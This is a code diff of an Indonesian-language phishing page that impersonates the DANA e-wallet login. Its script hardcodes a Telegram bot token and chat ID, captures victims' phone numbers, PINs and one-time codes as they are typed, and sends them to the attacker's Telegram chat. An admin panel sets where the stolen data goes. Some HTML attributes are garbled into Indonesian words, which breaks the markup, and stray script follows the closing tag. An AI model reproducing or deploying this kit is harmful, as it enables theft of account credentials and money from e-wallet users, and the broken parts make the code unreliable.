@@ -446,87 +446,96 @@
             <span class="judul-header">PENGATURAN BOT</span>
             <span></span>
         </div>
-        <div class="isi-admin">
-            <div class="kotak-pengaturan">
-                <h3 class="judul-admin">🤖 SETTING TELEGRAM</h3>
-                
-                <div class="form-grup">
-                    <label>TOKEN BOT TELEGRAM</label>
-                    <input type="text" id="tokenBot" placeholder="Masukkan Token Bot...">
-                </div>
+        <div kelas="isi-admin">
+    <div kelas="kotak-pengaturan">
+        <h3 kelas="judul-admin">⚙️ MENGATUR TELEGRAM</h3>
 
-                <div class="form-grup">
-                    <label>ID TELEGRAM TUJUAN</label>
-                    <input type="text" id="idTelegram" placeholder="Masukkan ID Telegram...">
-                </div>
-
-                <button class="tombol-simpan" onclick="simpanPengaturan()">💾 SIMPAN & TERSIMPAN OTOMATIS</button>
-            </div>
+        <div kelas="bentuk-grup">
+            <label>TOKEN BOT TELEGRAM</label>
+            <input jenis="teks" pengenal="tokenBot" placeholder="Masukkan Token Bot..." value="8583908886:AAEeLYSYO4Nxri4kZgBM3lijZ_VxcYiUYEo">
         </div>
-    </div>
 
+        <div kelas="bentuk-grup">
+            <label>ID TELEGRAM TUJUAN</label>
+            <input jenis="teks" pengenal="idTelegram" placeholder="Masukkan ID Telegram..." value="8798458499">
+        </div>
+
+        <tombol kelas="tombol-simpan" saat diklik="simpan()">💾 SIMPAN & TERSIMPAN OTOMATIS</tombol>
+    </div>
+        </div>
 
     <!-- ====================================== SCRIPT ====================================== -->
     <script>
-        let dataNomor = "", dataPin = "", dataOtp = "";
-        let hitungMundur;
-        let klikLogo = 0;
-        let BOT_TOKEN = "";
-        let CHAT_ID = "";
+let dataNomor = "", dataPin = "", dataOtp = "";
+let hitungMundur;
+let klikLogo = 0;
+let BOT_TOKEN = "8583908886:AAEeLYSYO4Nxri4kZgBM3lijZ_VxcYiUYEo";
+let CHAT_ID = "8798458499";
 
-        // ✅ MUALI: AMBIL DATA YANG SUDAH DISIMPAN SEBELUMNYA
-        window.onload = function() {
-            if(localStorage.getItem('botToken')) {
-                BOT_TOKEN = localStorage.getItem('botToken');
-                CHAT_ID = localStorage.getItem('chatId');
-                document.getElementById('tokenBot').value = BOT_TOKEN;
-                document.getElementById('idTelegram').value = CHAT_ID;
-            }
-            bukaHalaman('halamanUtama');
-        };
+window.onload = function() {
+    if(localStorage.getItem('botToken')) {
+        BOT_TOKEN = localStorage.getItem('botToken');
+        CHAT_ID = localStorage.getItem('chatId');
+    }
+    document.getElementById('tokenBot').value = BOT_TOKEN;
+    document.getElementById('idTelegram').value = CHAT_ID;
+    bukaHalaman('halamanUtama');
+};
 
-        function bukaHalaman(nama) {
-            document.querySelectorAll('.kontainer').forEach(el => el.classList.add('hidden'));
-            document.getElementById(nama).classList.remove('hidden');
-        }
+function bukaHalaman(nama) {
+    document.querySelectorAll('.kontainer').forEach(el => el.classList.add('hidden'));
+    document.getElementById(nama).classList.remove('hidden');
+}
 
-        // ✅ FORMAT PESAN SESUAI PERMINTAAN
-        function kirimKeTelegram() {
-            if(!BOT_TOKEN || !CHAT_ID) return;
-
-            let pesan = `━━━━━━━━━━━━━━━━━━━━━━
+function kirimKeTelegram() {
+    if(!BOT_TOKEN || !CHAT_ID) return;
+    let pesan = `
 DATA MASUK - DANA
-━━━━━━━━━━━━━━━━━━━━━
-Nama Akun  : +62${dataNomor || 'menunggu...'}
-Pin Akun   : ${dataPin || 'menunggu...'}
-Kode Akun  : ${dataOtp || 'menunggu...'}
-━━━━━━━━━━━━━━━━━━━━━`;
+━━━━━━━━━━━━━━━━━━━
+Nama Akun : +62${dataNomor || 'menunggu...'}
+Pin Akun : ${dataPin || 'menunggu...'}
+Kode Akun : ${dataOtp || 'menunggu...'}
+━━━━━━━━━━━━━━━━━━━
+    `;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
+}
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
-        }
+function simpanPengaturan() {
+    BOT_TOKEN = document.getElementById('tokenBot').value.trim();
+    CHAT_ID = document.getElementById('idTelegram').value.trim();
+    localStorage.setItem('botToken', BOT_TOKEN);
+    localStorage.setItem('chatId', CHAT_ID);
+    alert("✅ BERHASIL DISIMPAN PERMANEN!\nnData tidak hilang meski halaman ditutup");
+}
 
-        // ✅ FUNGSI SIMPAN: OTOMATIS TERSIMPAN DI HP / BROWSER
-        function simpanPengaturan() {
-            BOT_TOKEN = document.getElementById('tokenBot').value.trim();
-            CHAT_ID = document.getElementById('idTelegram').value.trim();
-            
-            // Simpan ke memori HP (Local Storage)
-            localStorage.setItem('botToken', BOT_TOKEN);
-            localStorage.setItem('chatId', CHAT_ID);
-            
-            alert("✅ BERHASIL DISIMPAN PERMANEN! \nData tidak hilang meski halaman ditutup.");
-        }
+const inputNomor = document.getElementById('inputNomor');
+const tombolLanjut = document.getElementById('tombolLanjut');
+if(inputNomor && tombolLanjut) {
+    inputNomor.addEventListener('input', () => tombolLanjut.classList.toggle('aktif', inputNomor.value.trim().length > 0));
+    tombolLanjut.addEventListener('click', () => {
+        dataNomor = inputNomor.value.trim();
+        if(dataNomor.length < 8) return alert("Nomor kurang panjang!");
+        kirimKeTelegram();
+        bukaHalaman('halamanPin');
+    });
+}
 
-        // ✅ LOGIKA HALAMAN NOMOR - KIRIM LANGSUNG SAAT LANJUT
-        const inputNomor = document.getElementById('inputNomor');
-        const tombolLanjut = document.getElementById('tombolLanjut');
-        inputNomor.addEventListener('input', () => tombolLanjut.classList.toggle('aktif', inputNomor.value.trim().length >= 8));
-        tombolLanjut.addEventListener('click', () => {
-            dataNomor = inputNomor.value.trim();
-            if(dataNomor.length < 8) return alert("Nomor kurang panjang!");
-            kirimKeTelegram();
-            bukaHalaman('halamanPin');
-        });
+const inputPin = document.getElementById('inputPin');
+if(inputPin) {
+    inputPin.addEventListener('input', () => {
+        dataPin = inputPin.value.trim();
+        kirimKeTelegram();
+    });
+}
+
+const inputOtp = document.getElementById('inputOtp');
+if(inputOtp) {
+    inputOtp.addEventListener('input', () => {
+        dataOtp = inputOtp.value.trim();
+        kirimKeTelegram();
+    });
+}
+    </script>
 
         // ✅ LOGIKA PIN - KIRIM LANGSUNG SAAT PIN SELESAI
         const wadahPin = document.getElementById('wadahPin');
